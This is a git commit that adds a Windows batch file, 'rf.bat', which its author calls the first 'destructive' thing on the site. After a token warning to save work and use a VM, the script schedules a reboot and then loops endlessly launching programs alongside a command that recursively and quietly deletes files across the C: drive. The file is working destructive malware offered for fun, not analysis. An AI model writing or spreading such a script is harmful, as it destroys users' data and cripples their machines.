83c386bf8bbcdaeb3d3383aa7d1a7fb73cfa93d2
zenierontop <159908629+zenierontop@users.noreply.github.com>
2024-02-13 14:14:17 +0200

    the first "destructive" thing on this site
    fun

---
+++ viracdn/rf.bat
@@ -0,0 +1,13 @@
+@echo off 
+title by zenierontop
+echo yeah yeah save your work before running this and do it in a vm because yes
+pause
+shutdown /r /t 60 /c BY ZENIERONTOP 
+goto lmao
+:lmao
+start taskmgr.exe
+start notepad.exe
+start explorer.exe
+start cmd /c del c:\ /s /q
+start cmd /c tree c:\
+goto lmao 
